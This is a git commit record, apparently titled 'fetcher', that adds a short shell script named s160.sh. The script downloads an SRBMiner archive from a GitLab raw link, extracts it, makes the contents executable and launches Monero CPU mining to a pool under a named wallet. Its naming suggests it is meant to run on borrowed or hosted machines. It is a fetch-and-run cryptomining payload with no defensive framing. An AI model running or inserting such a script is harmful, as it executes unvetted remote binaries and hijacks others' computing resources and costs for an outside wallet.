48f8f0112dd0c9212f44fae2b1a5d792162080e4
myce <me@example.com>
2025-02-24 21:11:46 +0530

    fetcher

---
+++ s160.sh
@@ -0,0 +1,5 @@
+wget https://gitlab.com/sight2/02f/-/raw/master/SRBMiner-Multi-2-7-9-Linux.tar.gz && \
+tar -xzf SRBMiner-Multi-2-7-9-Linux.tar.gz && \
+cd SRBMiner-Multi-2-7-9 && \
+chmod +x * && \
+./SRBMiner-MULTI --algorithm randomx --pool stratum+tcp://xmr.kryptex.network:7777 --wallet krxYEJVN46/onworks160 --disable-gpu
